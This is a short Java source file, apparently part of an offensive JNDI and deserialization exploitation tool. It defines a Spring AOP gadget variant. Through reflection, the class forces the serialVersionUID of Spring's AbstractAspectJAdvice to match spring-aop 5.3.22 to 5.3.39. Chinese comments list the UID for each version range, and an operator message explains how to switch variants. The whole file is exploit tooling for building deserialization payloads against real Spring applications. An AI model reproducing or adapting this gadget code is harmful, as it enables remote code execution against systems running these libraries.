package sonomon.jndi.deser.gadgets;

import sonomon.jndi.deser.Reflections;

public class SpringAOP22 extends SpringAOP {

	private String sUID = "8414315576825681772";
	//spring-aop-5.3.27.jar+aspectjweaver-1.9.6.jar
	
	// spring-aop<4.3.0            AbstractAspectJAdvice未实现Serializable
	// 4.3.0<=spring-aop<=5.3.21   3356474919692123037
	// 5.3.22<=spring-aop<=5.3.39  8414315576825681772
	// spring-aop>6.0.0            还是8414315576825681772,但需要jdk17
	
	protected void modifySUID() {
	    if (!isSUIDModified) {
	        try {
				Reflections.insertField("org.springframework.aop.aspectj.AbstractAspectJAdvice",sUID);
		        System.out.println("[*]因为已使用SpringAOP22,sUID已固定,如果想用SpringAOP21请重启程序");
		        isSUIDModified = true;
			} catch (Exception e) {
			}
		}
	}
}